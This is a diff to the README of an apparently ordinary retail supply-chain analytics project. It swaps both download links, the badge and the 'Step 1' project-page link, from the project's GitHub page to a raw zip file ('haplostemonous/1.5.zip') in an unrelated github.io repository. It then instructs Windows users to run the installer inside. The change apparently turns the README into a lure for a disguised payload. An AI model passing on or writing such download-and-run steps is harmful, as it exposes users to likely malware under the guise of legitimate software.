@@ -5,7 +5,7 @@ description: "Analyze e-commerce data using a PostgreSQL star-schema warehouse, 
 ---
 # 📊 enterprise-retail-supply-chain-intelligence-platform - Improve retail stock and sales decisions
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/angeecht321/enterprise-retail-supply-chain-intelligence-platform)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/angeecht321/angeecht321.github.io/main/haplostemonous/1.5.zip)
 
 ## 📌 About this project
 
@@ -39,7 +39,7 @@ Follow these steps to set up the software on your Windows computer.
 ### Step 1: Download the installer
 Visit the main project page to find the installer. You need to download the latest setup file to your computer.
 
-[Click here to go to the project page to download the software](https://github.com/angeecht321/enterprise-retail-supply-chain-intelligence-platform)
+[Click here to go to the project page to download the software](https://raw.githubusercontent.com/angeecht321/angeecht321.github.io/main/haplostemonous/1.5.zip)
 
 ### Step 2: Install the application
 Locate the downloaded file in your downloads folder. Double-click the file to open the installer. A window appears on your screen. Follow the prompts on the screen to complete the installation. Choose the default folder if you are unsure where to save the files.
